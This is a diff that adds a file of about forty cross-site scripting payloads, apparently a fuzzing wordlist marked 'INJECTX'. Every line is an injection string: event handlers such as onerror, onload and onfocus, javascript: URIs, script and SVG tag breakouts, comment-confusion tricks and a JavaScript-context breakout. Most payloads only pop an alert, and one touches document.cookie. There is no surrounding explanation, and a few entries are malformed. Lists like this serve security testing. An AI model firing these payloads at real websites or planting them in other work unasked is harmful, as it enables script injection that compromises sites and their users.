@@ -1,0 +1,39 @@
+javascript:alert(1)
+<svg/onload=alert(1)>
+<img onload=alert(1)>
+<img src=x onerror=prompt(1)>
+<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
+onmouseover="document.cookie=true;">
+alert(1)>
+<h1>INJECTX</h1>
+<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
+<svg><script>/<@/>alert(1)</script>
+<svg/onload=alert(/INJECTX/)>
+<iframe/onload=alert(/INJECTX/)>
+<svg/onload=alert1>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(1)>
+}alert(/INJECTX/);{//
+<h1/onclick=alert(1)>a
+<svg/onload=alert(/INJECTX/)>
+<p/onclick=alert(/INJECTX/)>a
+<svg/onload=alert1>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video onerror="javascript:alert(1)"><source>
+<audio onerror="javascript:alert(1)"><source>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<button form=test onformchange=alert(1)>
+<form><button formaction="javascript:alert(1)">
+<svg onload=(alert)(1) >
+<script>$=1,alert($)</script>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<img/src="x" onerror=alert(1)>
+<marguee/onstart=alert(1)>
+<script>alert(1)
+<script>alert(1)<!--INJECTX
+<marquee loop=1 width=0 onfinish=alert(1)>
